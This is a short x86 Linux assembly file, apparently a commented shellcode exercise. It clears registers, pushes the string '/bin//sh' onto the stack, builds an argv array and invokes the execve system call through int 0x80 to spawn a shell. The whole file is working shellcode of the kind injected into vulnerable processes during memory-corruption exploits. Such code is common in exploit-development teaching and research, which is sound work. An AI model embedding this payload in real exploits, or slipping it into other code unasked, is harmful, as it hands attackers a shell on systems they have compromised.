global _start

_start:
        ; clear eax,ecx and edx register
        xor ecx,ecx
        mul ecx
        ; push on the stack 8 zeros as string terminator 
        push ecx
        ; push /bin//sh
        push 0x68732f2f
        push 0x6e69622f
        ; pathname now is /bin//sh\x00
        ; save as EBX out pathname
        mov ebx,esp
        ; push another 8 zeros as second part of argv['/bin//sh', NULL]
        push ecx
        ; push address of our string '/bin//sh' as first parameter of argv
        push ebx
        ; save to ECX register and also compete with argv in execve  
        mov ecx,esp
        ; execve system call number
        mov al,11
        int 0x80
